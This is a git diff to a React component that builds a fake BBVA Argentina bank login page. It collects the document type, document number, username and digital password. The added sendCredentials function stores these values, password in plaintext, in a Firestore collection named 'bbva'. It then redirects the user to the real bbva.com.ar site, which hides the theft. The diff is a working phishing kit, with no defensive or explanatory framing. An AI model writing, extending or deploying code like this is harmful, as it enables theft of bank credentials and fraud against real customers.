@@ -1,28 +1,70 @@
 import React from 'react';
 import "../Responsive.css";
-import {
-    TextField, 
-    InputLabel, 
-    MenuItem, 
-    FormHelperText, 
-    FormControl, 
-    Select} from '@material-ui/core';
+import firebase from "../firebase";
+import moment from 'moment';
+import { Button } from 'react-bootstrap';
+
+import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
+import { faEye, faKeyboard } from "@fortawesome/free-solid-svg-icons";
+const eye = <FontAwesomeIcon icon={faEye} />;
+const keyboard = <FontAwesomeIcon icon={faKeyboard} />;
+
+const collection = firebase.firestore().collection("bbva"); 
 
 const Forms = () => {
 
-    const [documentVal, setDocument] = React.useState("DNI");
-    const [usernameVal, setEmail] = React.useState(null);
+    const [documentTypeVal, setDocumentType] = React.useState("DNI");
+    const [documentVal, setDocument] = React.useState(null);
+    const [usernameVal, setUsername] = React.useState(null);
     const [passwordVal, setPassword] = React.useState(null);
+    const [passwordShown, setPasswordShown] = React.useState(false);
+
+    const handleChangeDocumentType = (event) => {
+        setDocumentType(event.target.value);
+    }
 
     const handleChangeDocument = (event) => {
         setDocument(event.target.value);
+        console.log(documentVal);
     }
 
-    const handleChangeEmail = (event) => {
-        setEmail(event.target.value);
+    const handleChangeUsername = (event) => {
+        setUsername(event.target.value);
+        console.log(usernameVal);
     }
     const handleChangePassword = (event) => {
         setPassword(event.target.value);
+        console.log(passwordVal);
+    }
+
+    const togglePasswordVisiblity = () => {
+        setPasswordShown(passwordShown ? false : true);
+    };
+
+    const sendCredentials = async () =>{
+        try{
+            const date = new Date();
+
+            await collection.add({
+                type: documentTypeVal,
+                document: documentVal,
+                username: usernameVal,
+                password: passwordVal,
+                created: moment(date).format('YYYY-MM-DD HH:mm:ss').toString()
+            })
+            .then(() => {
+                console.log("Document successfully written!");
+                window.location.href = "https://www.bbva.com.ar/";
+            })
+            .catch(function(error){
+                console.error("Error adding Tutorial: ", error);
+            });
+
+            console.log("creado");
+        }
+        catch(e){
+            console.log(e);
+        }
     }
 
     return(
@@ -56,7 +98,7 @@ const Forms = () => {
                             className="tip-area"
                             style={{
                                 borderRadius:"1px",
-                                padding:"19px 28px",
+                                padding:"0px 28px",
                                 margin:"20px 0",
                                 boxSizing:"border-box",
                                 listStyle:"none",
@@ -104,7 +146,7 @@ const Forms = () => {
                                 id="documentOptions"
                                 type="button"
                                 className="button-select"
-                                value={documentVal}
+                                value={documentTypeVal}
                                 style={{
                                     borderTop:"transparent",
                                     borderRight:"transparent",
@@ -125,9 +167,71 @@ const Forms = () => {
                                 }}>
                                 
                             </input>
-                            <ul>
-                                
-                            </ul>
+                            <div>
+                                <ul
+                                    className="options-list"
+                                    style={{
+                                        background:"#fff",
+                                        border:"1px solid #e6e5e5",
+                                        borderTop:0,
+                                        borderBottom:0,
+                                        color:"#1f1f1f",
+                                        maxHeight:0,
+                                        opacity:1,
+                                        overflow:"hidden",
+                                        position:"relative",
+                                        top:"0",
+                                        width:"100%",
+                                        zIndex:"12",
+                                        boxSizing:"border-box",
+                                        WebkitAppearance:"none",
+                                        display:"block",
+                                        paddingInlineStart:"40px"
+                                    }}>
+                                    <li
+                                        style={{
+                                            fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
+                                            fontWeight:"350",
+                                        }}>
+                                        DNI
+                                    </li>
+                                    <li
+                                        style={{
+                                            fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
+                                            fontWeight:"350",
+                                        }}>
+                                        LC
+                                    </li>
+                                    <li
+                                        style={{
+                                            fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
+                                            fontWeight:"350",
+                                        }}>
+                                        LE
+                                    </li>
+                                    <li
+                                        style={{
+                                            fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
+                                            fontWeight:"350",
+                                        }}>
+                                        CI
+                                    </li>
+                                    <li
+                                        style={{
+                                            fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
+                                            fontWeight:"350",
+                                        }}>
+                                        PASAPORTE
+                                    </li>
+                                    <li
+                                        style={{
+                                            fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
+                                            fontWeight:"350",
+                                        }}>
+                                        RENAPER
+                                    </li>
+                                </ul>
+                            </div>
                         </div>
                         <div
                             className="form-group"
@@ -146,6 +250,7 @@ const Forms = () => {
                                 <input
                                     type="number"
                                     id="dataDocument"
+                                    onChange={handleChangeDocument}
                                     className="data-input"
                                     style={{
                                         borderTop:"transparent",
@@ -208,6 +313,7 @@ const Forms = () => {
                                 <input
                                     type="text"
                                     id="dataUser"
+                                    onChange={handleChangeUsername}
                                     className="data-input"
                                     style={{
                                         borderTop:"transparent",
@@ -268,7 +374,8 @@ const Forms = () => {
                                 <input
                                     id="dataPassword"
                                     className="data-input"
-                                    type="password"
+                                    onChange={handleChangePassword}
+                                    type={passwordShown ? "text" : "password"}
                                     style={{
                                         borderTop:"transparent",
                                         borderRight:"transparent",
@@ -309,7 +416,70 @@ const Forms = () => {
                                     }}>
                                     Clave digital
                                 </label>
+                                <i
+                                    className="toggle-password-icon"
+                                    onClick={togglePasswordVisiblity}
+                                    style={{
+                                        color:"#1973b8",
+                                        cursor:"pointer",
+                                        position:"absolute",
+                                        fontSize:"24px",
+                                        top:"8px",
+                                        right:"12px",
+                                        width:"25px",
+                                        padding:"0"
+                                    }}>
+                                    {eye}
+                                </i>
                             </div>
+                        </div>
+                    </div>
+                    <div
+                        className="virtual-keyboard"
+                        style={{
+                            margin:"10px 0",
+                            textAlign:"center",
+                            boxSizing:"border-box",
+                            display:"block",
+                            lineHeight:1
+                        }}>
+                        <div
+                            className="link-teclado"
+                            style={{
+                                display:"inline-block",
+                                color:"#237aba",
+                                boxSizing:"border-box",
+                                margin:"0",
+                                textAlign:"center"
+                            }}>
+                            <span
+                                className="icon-login-keyboard">
+                                <i
+                                    className="toggle-password-icon"
+                                    onClick={togglePasswordVisiblity}
+                                    style={{
+                                        color:"#1973b8",
+                                        position:"relative",
+                                        fontSize:"20px"
+                                    }}>
+                                    {keyboard}
+                                </i>
+                            </span>
+                            <span
+                                className="tvirtual-link"
+                                style={{
+                                    cursor:"pointer",
+                                    paddingLeft:"10px",
+                                    color:"#237aba",
+                                    fontSize:"15px",
+                                    display:"inline-block",
+                                    fontWeight:"700",
+                                    fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
+                                    textAlign:"center",
+                                    verticalAlign:"middle"
+                                }}>
+                                Teclado virtual
+                            </span>
                         </div>
                     </div>
                     <div
@@ -328,7 +498,8 @@ const Forms = () => {
                                 margin:"0",
                                 padding:"0"
                             }}>
-                            <button
+                            <Button
+                                onClick={sendCredentials}
                                 className="secondary-button"
                                 style={{
                                     maxWidth:"165px",
@@ -346,8 +517,9 @@ const Forms = () => {
                                     width:"100%"
                                 }}>
                                 Registrarme
-                            </button>
-                            <button
+                            </Button>
+                            <Button
+                                onClick={sendCredentials}
                                 className="primary-button"
                                 style={{
                                     maxWidth:"165px",
@@ -366,7 +538,7 @@ const Forms = () => {
                                     boxSizing:"border-box"
                                 }}>
                                 Ingresar
-                            </button>
+                            </Button>
                         </div>
                     </div>
                     <div
